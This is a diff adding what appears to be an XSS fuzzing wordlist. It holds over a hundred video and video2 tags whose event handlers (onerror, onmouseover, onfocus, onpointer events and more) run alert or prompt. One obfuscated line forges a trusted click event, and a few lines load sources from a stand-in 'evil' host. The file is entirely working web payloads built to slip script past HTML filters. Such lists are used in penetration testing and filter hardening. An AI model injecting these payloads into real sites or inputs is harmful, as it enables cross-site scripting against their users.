@@ -1,0 +1,116 @@
+<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
+<video autoplay controls onpause=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onseeked=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onseeking=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onvolumechange=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onwaiting=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video autoplay onloadedmetadata=alert(1)> <source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay onplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay onplaying=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video controls autoplay onended=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video controls autoplay ontimeupdate=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video controls ondurationchange=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
+<video controls onprogress=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
+<video controls src=1 onfocus=alert(1) autofocus>
+<video controls src=1 onfocusin=alert(1) autofocus>
+<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE
+"></video>
+<video draggable="true" ondrag="alert(1)">test</video>
+<video draggable="true" ondragend="alert(1)">test</video>
+<video draggable="true" ondragenter="alert(1)">test</video>
+<video draggable="true" ondragleave="alert(1)">test</video>
+<video draggable="true" ondragstart="alert(1)">test</video>
+<video id=x controls onfocus=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video id=x controls onfocusin=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video id=x tabindex=1 onactivate=alert(1)></video>
+<video id=x tabindex=1 onbeforeactivate=alert(1)></video>
+<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>
+<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>
+<video onafterscriptexecute=alert(1)><script>1</script>
+<video onbeforecopy="alert(1)" contenteditable>test</video>
+<video onbeforecut="alert(1)" contenteditable>test</video>
+<video onbeforepaste="alert(1)" contenteditable>test</video>
+<video onbeforescriptexecute=alert(1)><script>1</script>
+<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>
+<video oncanplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video onclick="alert(1)">test</video>
+<video oncontextmenu="alert(1)">test</video>
+<video oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<video oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<video ondblclick="alert(1)" autofocus tabindex=1>test</video>
+<video onfocusout=alert(1) tabindex=1 id=x></video><input autofocus>
+<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>
+<video onkeydown="alert(1)" contenteditable>test</video>
+<video onkeypress="alert(1)" contenteditable>test</video>
+<video onkeyup="alert(1)" contenteditable>test</video>
+<video onloadeddata=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video onmousedown="alert(1)">test</video>
+<video onmouseenter="alert(1)">test</video>
+<video onmouseleave="alert(1)">test</video>
+<video onmousemove="alert(1)">test</video>
+<video onmouseout="alert(1)">test</video>
+<video onmouseover="alert(1)">test</video>
+<video onmouseup="alert(1)">test</video>
+<video onloadstart=alert(1)><source>
+<video onmousewheel=alert(1)>requires scrolling
+<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>
+<video onpaste="alert(1)" contenteditable>test</video>
+<video onpointerdown=alert(1)>XSS</video>
+<video onpointerenter=alert(1)>XSS</video>
+<video onpointerleave=alert(1)>XSS</video>
+<video onpointermove=alert(1)>XSS</video>
+<video onpointerout=alert(1)>XSS</video>
+<video onpointerover=alert(1)>XSS</video>
+<video onpointerrawupdate=alert(1)>XSS</video>
+<video onpointerup=alert(1)>XSS</video>
+<video src/onerror=alert(1)>
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video src=_ onloadstart="alert(1)">
+<video><source onerror=alert(1) src=1></video>
+<video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
+<video><track default src="//evil?
+<video><source src="//evil?
+<videogt;<source onerror=javascript:prompt(911)gt;
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<video poster=javascript:javascript:alert(1)//
+<video><source onerror="javascript:javascript:alert(1)">
+<video onerror="javascript:javascript:alert(1)"><source>
+<video><source onerror="javascript:alert(1)">//INJECTX
+<video onerror="javascript:alert(1)"><source>//INJECTX
+<video2 draggable="true" ondrag="alert(1)">test</video2>
+<video2 draggable="true" ondragend="alert(1)">test</video2>
+<video2 draggable="true" ondragenter="alert(1)">test</video2>
+<video2 draggable="true" ondragleave="alert(1)">test</video2>
+<video2 draggable="true" ondragstart="alert(1)">test</video2>
+<video2 id=x tabindex=1 onactivate=alert(1)></video2>
+<video2 id=x tabindex=1 onbeforeactivate=alert(1)></video2>
+<video2 id=x tabindex=1 onbeforedeactivate=alert(1)></video2><input autofocus>
+<video2 id=x tabindex=1 ondeactivate=alert(1)></video2><input id=y autofocus>
+<video2 onafterscriptexecute=alert(1)><script>1</script>
+<video2 onbeforescriptexecute=alert(1)><script>1</script>
+<video2 onclick="alert(1)">test</video2>
+<video2 oncontextmenu="alert(1)">test</video2>
+<video2 oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<video2 oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<video2 ondblclick="alert(1)" autofocus tabindex=1>test</video2>
+<video2 onkeydown="alert(1)" contenteditable>test</video2>
+<video2 onkeypress="alert(1)" contenteditable>test</video2>
+<video2 onkeyup="alert(1)" contenteditable>test</video2>
+<video2 onmousedown="alert(1)">test</video2>
+<video2 onmouseenter="alert(1)">test</video2>
+<video2 onmouseleave="alert(1)">test</video2>
+<video2 onmousemove="alert(1)">test</video2>
+<video2 onmouseout="alert(1)">test</video2>
+<video2 onmouseover="alert(1)">test</video2>
+<video2 onmouseup="alert(1)">test</video2>
+<video2 onmousewheel=alert(1)>requires scrolling
+<video2 onpointerdown=alert(1)>XSS</video2>
+<video2 onpointerenter=alert(1)>XSS</video2>
+<video2 onpointerleave=alert(1)>XSS</video2>
+<video2 onpointermove=alert(1)>XSS</video2>
+<video2 onpointerout=alert(1)>XSS</video2>
+<video2 onpointerover=alert(1)>XSS</video2>
+<video2 onpointerrawupdate=alert(1)>XSS</video2>
+<video2 onpointerup=alert(1)>XSS</video2>
